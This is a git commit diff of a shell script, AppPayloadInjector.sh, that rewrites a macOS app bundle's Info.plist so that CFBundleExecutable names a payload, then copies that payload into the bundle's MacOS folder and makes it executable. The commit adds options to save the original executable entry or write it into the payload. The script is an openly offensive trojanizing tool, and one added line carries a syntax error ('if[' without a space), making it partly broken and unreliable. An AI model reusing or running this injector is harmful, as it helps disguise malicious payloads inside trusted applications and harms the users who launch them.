85fa8140865cfd2b6cc040fa18c45736098f79c3
Love Borgström <loveborgstrom98@gmail.com>
2016-08-24 13:28:58 +0200

    Add files via upload

--- AppPayloadInjector.sh
+++ AppPayloadInjector.sh
@@ -11,13 +11,33 @@ else
 	else
 		PayloadName="$3"
 	fi
-	AR=$(wc -l < "$TRUESRC/Contents/Info.plist" )
+	if [ "$4" == "" ];then
+		OES=0
+	elif [ "${4:0:7}" == "ToFile_" ];then
+		OES=1
+		OFP=$(echo "$4" | sed "s%ToFile_%%g") && OFP=$(echo "$OFP" | sed 's%\\%%g') && OFP=$(echo "$OFP" | sed -e 's%[[:space:]]*$%%')
+	elif [ "$4" == "InjectInPayloadEnd" ];then
+		OES=2
+	elif [ "${4:0:20}" == "InjectInPayloadLine_" ];then
+		OES=3
+		IPL=$(echo "$4" | sed "s%InjectInPayloadLine_%%g")
+	else
+		echo 'Incorrect usage on $4, read the README.md'
+	fi
+	AR=$(wc -l < "$TRUESRC/Contents/Info.plist")
 	R=1
 	chmod 755 "$TRUESRC"
 	while [ $R -lt $AR ];do
 		line=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist")
 		if [ $(echo "$line" | grep -q "<key>CFBundleExecutable</key>" && echo $? || echo 1) = 0 ];then
 			let R=R+1
+			if [ "$OES" -gt 0 ];then
+			SR=$R
+			CL=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist")
+				if [ "$OES" -eq 1 ];then
+					echo "$CL" > "$OFP"
+				fi
+			fi
 			sed -i '' -e "$R s%<string>.*</string>%<string>$PayloadName</string>%" "$TRUESRC/Contents/Info.plist"
 			let R=AR+1
 		else 
@@ -25,5 +45,10 @@ else
 		fi
 	done
 	cp "$TRUEPATH" "$TRUESRC/Contents/MacOS/$PayloadName"
+	if[ "$OES" -eq 2 ];then
+		echo "$CL" >> "$TRUESRC/Contents/MacOS/$PayloadName"
+	elif [ "$OES" -eq 3 ];then
+		sed -i '' -e "$SR s%.*%$CL%" "$TRUESRC/Contents/MacOS/$PayloadName"
+	fi
 	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
 fi
